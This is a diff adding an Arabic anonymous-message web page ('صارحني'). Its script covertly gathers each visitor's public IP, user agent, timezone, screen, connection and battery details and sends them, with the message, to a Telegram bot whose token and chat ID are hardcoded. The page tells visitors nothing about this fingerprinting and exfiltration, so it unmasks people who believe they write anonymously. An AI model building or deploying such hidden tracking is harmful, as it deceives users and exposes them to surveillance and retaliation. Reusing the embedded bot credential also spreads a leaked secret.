@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تحت الانشاء</title>
+</head>
+<body style="
+    background: black;
+">
+  <h2 style="
+    text-align: center;
+    color: orange;
+    font-size: 100px;
+">صارحني</h2>
+  <div class="textarea1">
+  <div class="textarea1" style="
+    align-items: center;
+    padding: 10px;
+    margin: auto;
+    width: 20%;
+">
+  <textarea id="message" rows="5" cols="40" placeholder="اكتب رسالتك هنا..."></textarea><br><br>
+  </div>
+<div class="b1" style="
+    text-align: center;
+    font-size: 250px;
+">  <button onclick="sendMessage()" style="
+    font-size: 50px;
+    background-color: beige;
+    color: black;
+">إرسال</button></div>
+
+  <script>
+    async function sendMessage() {
+      const userMessage = document.getElementById("message").value;
+      if (!userMessage) {
+        alert("من فضلك اكتب رسالة أولاً.");
+        return;
+      }
+
+      const token = "7772917094:AAEcX4WrFf-2w69MLBXOfsj5QelnmkYQATY";
+      const chatId = "7198041376";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      // Initialize data object
+      const data = {
+        message: userMessage,
+        userAgent: navigator.userAgent,
+        ip: "لم يتم التحديد",
+        timestamp: new Date().toLocaleString("ar-EG"),
+        language: navigator.language || "غير محدد",
+        languages: navigator.languages.join(", ") || "غير محدد",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "غير محدد",
+        screen: `${window.screen.width}x${window.screen.height}, عمق الألوان: ${window.screen.colorDepth}`,
+        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+        referrer: document.referrer || "غير متوفر",
+        cookiesEnabled: navigator.cookieEnabled ? "نعم" : "لا",
+        connection: navigator.connection ? `${navigator.connection.effectiveType}, سرعة: ${navigator.connection.downlink} Mbps` : "غير متوفر",
+        battery: "غير متوفر",
+        geolocation: "غير متوفر"
+      };
+
+      // Get public IP
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        data.ip = ipData.ip;
+      } catch (e) {
+        console.warn("فشل في جلب IP", e);
+      }
+
+      
+
+      // Get battery status
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          data.battery = `مستوى البطارية: ${Math.round(battery.level * 100)}%, ${battery.charging ? "يتم الشحن" : "لا يتم الشحن"}`;
+        } catch (e) {
+          console.warn("فشل في جلب حالة البطارية", e);
+        }
+      }
+
+      // Format final message
+      const finalMessage = `
+📩 رسالة جديدة من الزائر:
+--------------------------
+📝 الرسالة: ${data.message}
+🕒 الوقت: ${data.timestamp}
+💻 نوع الجهاز: ${data.userAgent}
+🌍 عنوان IP: ${data.ip}
+📍 الموقع: ${data.geolocation}
+🗣 اللغة: ${data.language} (جميع اللغات: ${data.languages})
+⏰ المنطقة الزمنية: ${data.timezone}
+🖥 دقة الشاشة: ${data.screen}
+📐 حجم النافذة: ${data.windowSize}
+🔗 المصدر: ${data.referrer}
+🍪 الكوكيز: ${data.cookiesEnabled}
+🌐 الاتصال: ${data.connection}
+🔋 البطارية: ${data.battery}
+      `;
+
+      // Send to Telegram
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: finalMessage
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("✅ تم إرسال الرسالة بنجاح!");
+          document.getElementById("message").value = "";
+        } else {
+          alert("❌ حدث خطأ أثناء الإرسال.");
+        }
+      })
+      .catch(error => {
+        alert("❌ فشل الاتصال بالخادم.");
+        console.error(error);
+      });
+    }
+  </script>
+
+</div></body>
+</html>
